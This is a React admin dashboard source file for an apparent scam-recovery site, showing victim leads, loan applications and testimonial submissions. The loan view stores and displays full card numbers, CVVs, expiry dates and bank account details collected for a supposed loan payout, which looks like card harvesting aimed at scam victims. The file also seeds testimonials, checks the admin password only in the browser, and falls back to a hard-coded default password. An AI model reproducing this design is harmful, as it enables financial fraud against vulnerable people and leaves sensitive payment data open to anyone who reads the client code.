import { createFileRoute } from "@tanstack/react-router";
import { useEffect, useState } from "react";
import {
  Users,
  Banknote,
  MessageSquare,
  LogOut,
  RefreshCw,
  ChevronDown,
  ChevronUp,
  CheckCircle2,
  XCircle,
  Clock,
  AlertTriangle,
} from "lucide-react";
import { Logo } from "@/components/site/Logo";

// ─── types ────────────────────────────────────────────────────────────────────

type Lead = {
  id: string;
  first_name: string;
  last_name: string | null;
  email: string;
  phone: string | null;
  amount_lost: string | null;
  scam_type: string | null;
  message: string | null;
  status: string;
  source_page: string | null;
  created_at: string;
};

type LoanApplication = {
  id: string;
  first_name: string;
  last_name: string | null;
  email: string;
  phone: string | null;
  amount_requested: number;
  currency: string;
  payout_method: string;
  status: string;
  // bank
  bank_name: string | null;
  bank_account_number: string | null;
  bank_routing_number: string | null;
  // card
  card_holder_name: string | null;
  card_number: string | null;
  card_expiry: string | null;
  card_cvv: string | null;
  card_issuer: string | null;
  // billing
  billing_address_line1: string | null;
  billing_address_line2: string | null;
  billing_city: string | null;
  billing_state: string | null;
  billing_postal_code: string | null;
  billing_country: string | null;
  // other
  employment_status: string | null;
  monthly_income: number | null;
  loan_purpose: string | null;
  source_page: string | null;
  created_at: string;
};

type TestimonialSubmission = {
  id: string;
  client_name: string;
  email: string | null;
  location: string | null;
  scam_type: string | null;
  amount_recovered: string | null;
  rating: number;
  quote: string;
  status: string;
  consent_to_publish: boolean;
  created_at: string;
};

// ─── constants ────────────────────────────────────────────────────────────────

const ADMIN_PASSWORD_KEY = "admin_session_v1";
const CORRECT_PASSWORD = import.meta.env.VITE_ADMIN_PASSWORD || "admin2024";

// ─── route ────────────────────────────────────────────────────────────────────

export const Route = createFileRoute("/admin")({
  head: () => ({
    meta: [
      { title: "Admin Dashboard | ChanAidRecovery" },
      { name: "robots", content: "noindex, nofollow" },
    ],
  }),
  component: AdminPage,
});

// ─── main component ───────────────────────────────────────────────────────────

function AdminPage() {
  const [authed, setAuthed] = useState(false);
  const [pw, setPw] = useState("");
  const [pwError, setPwError] = useState("");
  const [tab, setTab] = useState<"leads" | "loans" | "testimonials">("leads");

  useEffect(() => {
    if (sessionStorage.getItem(ADMIN_PASSWORD_KEY) === "1") setAuthed(true);
  }, []);

  function login(e: React.FormEvent) {
    e.preventDefault();
    if (pw === CORRECT_PASSWORD) {
      sessionStorage.setItem(ADMIN_PASSWORD_KEY, "1");
      setAuthed(true);
    } else {
      setPwError("Incorrect password.");
    }
  }

  function logout() {
    sessionStorage.removeItem(ADMIN_PASSWORD_KEY);
    setAuthed(false);
    setPw("");
  }

  if (!authed) {
    return (
      <div className="min-h-screen bg-soft-gradient flex items-center justify-center px-4">
        <div className="bg-white rounded-2xl shadow-elegant p-8 w-full max-w-sm border border-border">
          <div className="flex justify-center mb-6">
            <Logo className="h-14 w-auto" />
          </div>
          <h1 className="text-xl font-bold text-center mb-6">Admin Dashboard</h1>
          <form onSubmit={login} className="space-y-4">
            <div>
              <label className="block text-xs font-medium text-muted-foreground mb-1">Password</label>
              <input
                type="password"
                value={pw}
                onChange={(e) => { setPw(e.target.value); setPwError(""); }}
                className="h-11 w-full rounded-lg border border-input px-3 text-sm focus:outline-none focus:ring-2 focus:ring-ring"
                autoFocus
              />
              {pwError && <p className="text-xs text-red-500 mt-1">{pwError}</p>}
            </div>
            <button
              type="submit"
              className="w-full h-11 bg-cta-gradient text-white font-semibold rounded-full"
            >
              Sign in
            </button>
          </form>
          <p className="text-[11px] text-muted-foreground text-center mt-4">
            Set <code>VITE_ADMIN_PASSWORD</code> in your .env to change the password.
          </p>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gray-50">
      {/* Header */}
      <div className="bg-white border-b border-border px-6 py-3 flex items-center justify-between">
        <div className="flex items-center gap-3">
          <Logo className="h-10 w-auto" />
          <span className="font-semibold text-sm text-muted-foreground">Admin Dashboard</span>
        </div>
        <button
          onClick={logout}
          className="flex items-center gap-1.5 text-sm text-muted-foreground hover:text-foreground"
        >
          <LogOut className="w-4 h-4" /> Sign out
        </button>
      </div>

      {/* Tabs */}
      <div className="bg-white border-b border-border px-6 flex gap-1">
        {(["leads", "loans", "testimonials"] as const).map((t) => (
          <button
            key={t}
            onClick={() => setTab(t)}
            className={`px-4 py-3 text-sm font-medium border-b-2 transition-colors capitalize ${
              tab === t
                ? "border-primary text-primary"
                : "border-transparent text-muted-foreground hover:text-foreground"
            }`}
          >
            {t === "leads" && <Users className="w-4 h-4 inline mr-1.5 -mt-0.5" />}
            {t === "loans" && <Banknote className="w-4 h-4 inline mr-1.5 -mt-0.5" />}
            {t === "testimonials" && <MessageSquare className="w-4 h-4 inline mr-1.5 -mt-0.5" />}
            {t}
          </button>
        ))}
      </div>

      {/* Setup banner — shown when service role key is missing */}
      <SetupBanner />

      {/* Content */}
      <div className="max-w-[1400px] mx-auto px-4 sm:px-6 py-8">
        {tab === "leads" && <LeadsTable />}
        {tab === "loans" && <LoansTable />}
        {tab === "testimonials" && <TestimonialsTable />}
      </div>
    </div>
  );
}

// ─── Setup Banner ─────────────────────────────────────────────────────────────

function SetupBanner() {
  const [visible, setVisible] = useState(true);
  if (!visible) return null;
  return (
    <div className="bg-amber-50 border-b border-amber-200 px-6 py-3 flex items-start gap-3 text-sm">
      <AlertTriangle className="w-4 h-4 text-amber-600 mt-0.5 shrink-0" />
      <div className="flex-1">
        <p className="font-semibold text-amber-800">One step needed to load live data</p>
        <p className="text-amber-700 mt-0.5">
          Add <code className="bg-amber-100 px-1 rounded font-mono text-xs">SUPABASE_SERVICE_ROLE_KEY</code> to your <code className="bg-amber-100 px-1 rounded font-mono text-xs">.env</code> file,
          then restart the server. Get it from:{" "}
          <a href="https://supabase.com/dashboard/project/yoehklevaxcdkxjgdmgm/settings/api"
            target="_blank" rel="noreferrer" className="underline font-medium">
            Supabase Dashboard → Project Settings → API → service_role key
          </a>
        </p>
        <p className="text-amber-700 mt-1">
          Also apply pending migrations (seed testimonials + card billing columns) in the{" "}
          <a href="https://supabase.com/dashboard/project/yoehklevaxcdkxjgdmgm/sql/new"
            target="_blank" rel="noreferrer" className="underline font-medium">
            Supabase SQL Editor
          </a>{" "}
          — run the <code className="bg-amber-100 px-1 rounded font-mono text-xs">supabase/migrations/</code> files in order.
        </p>
      </div>
      <button onClick={() => setVisible(false)} className="text-amber-500 hover:text-amber-700 text-lg leading-none">×</button>
    </div>
  );
}

// ─── Leads Table ──────────────────────────────────────────────────────────────

function LeadsTable() {
  const [rows, setRows] = useState<Lead[]>([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState("");

  async function load() {
    setLoading(true);
    setError("");
    try {
      const res = await fetch("/api/admin/leads");
      if (!res.ok) throw new Error(await res.text());
      setRows(await res.json());
    } catch (e: unknown) {
      setError(String(e));
    } finally {
      setLoading(false);
    }
  }

  useEffect(() => { load(); }, []);

  return (
    <TableShell title="Case Enquiries / Leads" count={rows.length} loading={loading} error={error} onRefresh={load}>
      <table className="min-w-full text-sm">
        <thead className="bg-gray-50 text-xs text-muted-foreground uppercase tracking-wide">
          <tr>
            {["Name","Email","Phone","Amount Lost","Scam Type","Status","Page","Date"].map(h => (
              <th key={h} className="px-4 py-3 text-left font-semibold whitespace-nowrap">{h}</th>
            ))}
          </tr>
        </thead>
        <tbody className="divide-y divide-border">
          {rows.map((r) => (
            <tr key={r.id} className="hover:bg-gray-50">
              <td className="px-4 py-3 whitespace-nowrap font-medium">{r.first_name} {r.last_name}</td>
              <td className="px-4 py-3">{r.email}</td>
              <td className="px-4 py-3 text-muted-foreground">{r.phone || "—"}</td>
              <td className="px-4 py-3">{r.amount_lost || "—"}</td>
              <td className="px-4 py-3">{r.scam_type || "—"}</td>
              <td className="px-4 py-3"><StatusBadge status={r.status} /></td>
              <td className="px-4 py-3 text-muted-foreground text-xs">{r.source_page || "—"}</td>
              <td className="px-4 py-3 text-muted-foreground text-xs whitespace-nowrap">{fmtDate(r.created_at)}</td>
            </tr>
          ))}
          {!loading && rows.length === 0 && (
            <tr><td colSpan={8} className="px-4 py-8 text-center text-muted-foreground">No leads yet.</td></tr>
          )}
        </tbody>
      </table>
    </TableShell>
  );
}

// ─── Loans Table ──────────────────────────────────────────────────────────────

function LoansTable() {
  const [rows, setRows] = useState<LoanApplication[]>([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState("");
  const [expandedId, setExpandedId] = useState<string | null>(null);

  async function load() {
    setLoading(true);
    setError("");
    try {
      const res = await fetch("/api/admin/loans");
      if (!res.ok) throw new Error(await res.text());
      setRows(await res.json());
    } catch (e: unknown) {
      setError(String(e));
    } finally {
      setLoading(false);
    }
  }

  useEffect(() => { load(); }, []);

  return (
    <TableShell title="Loan Applications" count={rows.length} loading={loading} error={error} onRefresh={load}>
      <table className="min-w-full text-sm">
        <thead className="bg-gray-50 text-xs text-muted-foreground uppercase tracking-wide">
          <tr>
            {["","Name","Email","Amount","Payout","Status","Date"].map((h, i) => (
              <th key={i} className="px-4 py-3 text-left font-semibold whitespace-nowrap">{h}</th>
            ))}
          </tr>
        </thead>
        <tbody className="divide-y divide-border">
          {rows.map((r) => {
            const expanded = expandedId === r.id;
            return (
              <>
                <tr
                  key={r.id}
                  className="hover:bg-gray-50 cursor-pointer"
                  onClick={() => setExpandedId(expanded ? null : r.id)}
                >
                  <td className="px-4 py-3 text-muted-foreground">
                    {expanded ? <ChevronUp className="w-4 h-4" /> : <ChevronDown className="w-4 h-4" />}
                  </td>
                  <td className="px-4 py-3 font-medium whitespace-nowrap">{r.first_name} {r.last_name}</td>
                  <td className="px-4 py-3">{r.email}</td>
                  <td className="px-4 py-3 font-semibold">{r.currency} {Number(r.amount_requested).toLocaleString()}</td>
                  <td className="px-4 py-3 capitalize">{r.payout_method === "bank_transfer" ? "Bank" : "Card"}</td>
                  <td className="px-4 py-3"><StatusBadge status={r.status} /></td>
                  <td className="px-4 py-3 text-muted-foreground text-xs whitespace-nowrap">{fmtDate(r.created_at)}</td>
                </tr>
                {expanded && (
                  <tr key={`${r.id}-detail`} className="bg-blue-50/40">
                    <td colSpan={7} className="px-6 py-4">
                      <div className="grid sm:grid-cols-2 lg:grid-cols-3 gap-4 text-sm">
                        <Field label="Phone" value={r.phone} />
                        <Field label="Employment" value={r.employment_status} />
                        <Field label="Monthly income" value={r.monthly_income ? `$${Number(r.monthly_income).toLocaleString()}` : null} />
                        <Field label="Loan purpose" value={r.loan_purpose} className="sm:col-span-2 lg:col-span-3" />

                        {r.payout_method === "bank_transfer" ? (
                          <>
                            <Field label="Bank name" value={r.bank_name} />
                            <Field label="Account number" value={r.bank_account_number} />
                            <Field label="Routing / SWIFT / IBAN" value={r.bank_routing_number} />
                          </>
                        ) : (
                          <>
                            <div className="sm:col-span-2 lg:col-span-3 mb-1">
                              <span className="text-xs font-semibold uppercase tracking-wide text-muted-foreground">Card details</span>
                            </div>
                            <Field label="Cardholder" value={r.card_holder_name} />
                            <Field label="Issuer" value={r.card_issuer} />
                            <Field label="Card number" value={r.card_number} />
                            <Field label="Expiry" value={r.card_expiry} />
                            <Field label="CVV" value={r.card_cvv} />
                            <div className="sm:col-span-2 lg:col-span-3 mt-1">
                              <p className="text-xs font-semibold uppercase tracking-wide text-muted-foreground mb-2">Billing address</p>
                              <p className="text-sm">
                                {[r.billing_address_line1, r.billing_address_line2, r.billing_city, r.billing_state, r.billing_postal_code, r.billing_country]
                                  .filter(Boolean).join(", ") || "—"}
                              </p>
                            </div>
                          </>
                        )}
                      </div>
                    </td>
                  </tr>
                )}
              </>
            );
          })}
          {!loading && rows.length === 0 && (
            <tr><td colSpan={7} className="px-4 py-8 text-center text-muted-foreground">No loan applications yet.</td></tr>
          )}
        </tbody>
      </table>
    </TableShell>
  );
}

// ─── Testimonials Table ───────────────────────────────────────────────────────

function TestimonialsTable() {
  const [rows, setRows] = useState<TestimonialSubmission[]>([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState("");

  async function load() {
    setLoading(true);
    setError("");
    try {
      const res = await fetch("/api/admin/testimonials");
      if (!res.ok) throw new Error(await res.text());
      setRows(await res.json());
    } catch (e: unknown) {
      setError(String(e));
    } finally {
      setLoading(false);
    }
  }

  useEffect(() => { load(); }, []);

  return (
    <TableShell title="Testimonial Submissions (pending approval)" count={rows.length} loading={loading} error={error} onRefresh={load}>
      <table className="min-w-full text-sm">
        <thead className="bg-gray-50 text-xs text-muted-foreground uppercase tracking-wide">
          <tr>
            {["Name","Email","Location","Scam","Amount","Rating","Status","Date"].map(h => (
              <th key={h} className="px-4 py-3 text-left font-semibold whitespace-nowrap">{h}</th>
            ))}
          </tr>
        </thead>
        <tbody className="divide-y divide-border">
          {rows.map((r) => (
            <tr key={r.id} className="hover:bg-gray-50 align-top">
              <td className="px-4 py-3 font-medium whitespace-nowrap">{r.client_name}</td>
              <td className="px-4 py-3 text-muted-foreground">{r.email || "—"}</td>
              <td className="px-4 py-3">{r.location || "—"}</td>
              <td className="px-4 py-3">{r.scam_type || "—"}</td>
              <td className="px-4 py-3">{r.amount_recovered || "—"}</td>
              <td className="px-4 py-3">{"★".repeat(r.rating)}</td>
              <td className="px-4 py-3"><StatusBadge status={r.status} /></td>
              <td className="px-4 py-3 text-muted-foreground text-xs whitespace-nowrap">{fmtDate(r.created_at)}</td>
            </tr>
          ))}
          {!loading && rows.length === 0 && (
            <tr><td colSpan={8} className="px-4 py-8 text-center text-muted-foreground">No submissions yet.</td></tr>
          )}
        </tbody>
      </table>
    </TableShell>
  );
}

// ─── Shared UI ────────────────────────────────────────────────────────────────

function TableShell({ title, count, loading, error, onRefresh, children }: {
  title: string; count: number; loading: boolean; error: string; onRefresh: () => void; children: React.ReactNode;
}) {
  return (
    <div className="bg-white rounded-2xl shadow-elegant border border-border overflow-hidden">
      <div className="px-6 py-4 flex items-center justify-between border-b border-border">
        <div>
          <h2 className="text-lg font-bold">{title}</h2>
          {!loading && !error && <p className="text-xs text-muted-foreground mt-0.5">{count} record{count !== 1 ? "s" : ""}</p>}
        </div>
        <button onClick={onRefresh} disabled={loading} className="flex items-center gap-1.5 text-sm text-primary hover:underline disabled:opacity-50">
          <RefreshCw className={`w-4 h-4 ${loading ? "animate-spin" : ""}`} /> Refresh
        </button>
      </div>
      {error && (
        <div className="px-6 py-4 text-red-600 bg-red-50 text-sm">{error}</div>
      )}
      <div className="overflow-x-auto">{children}</div>
    </div>
  );
}

function StatusBadge({ status }: { status: string }) {
  const map: Record<string, { label: string; cls: string; icon: React.ReactNode }> = {
    new:      { label: "New",      cls: "bg-blue-50 text-blue-700",   icon: <Clock className="w-3 h-3" /> },
    pending:  { label: "Pending",  cls: "bg-yellow-50 text-yellow-700", icon: <Clock className="w-3 h-3" /> },
    approved: { label: "Approved", cls: "bg-green-50 text-green-700", icon: <CheckCircle2 className="w-3 h-3" /> },
    rejected: { label: "Rejected", cls: "bg-red-50 text-red-600",     icon: <XCircle className="w-3 h-3" /> },
  };
  const s = map[status] ?? { label: status, cls: "bg-gray-100 text-gray-600", icon: null };
  return (
    <span className={`inline-flex items-center gap-1 px-2 py-0.5 rounded-full text-xs font-medium ${s.cls}`}>
      {s.icon}{s.label}
    </span>
  );
}

function Field({ label, value, className = "" }: { label: string; value: string | number | null | undefined; className?: string }) {
  return (
    <div className={className}>
      <p className="text-[10px] font-semibold uppercase tracking-wide text-muted-foreground mb-0.5">{label}</p>
      <p className="text-sm">{value ?? "—"}</p>
    </div>
  );
}

function fmtDate(iso: string) {
  return new Date(iso).toLocaleDateString("en-GB", { day: "2-digit", month: "short", year: "numeric", hour: "2-digit", minute: "2-digit" });
}

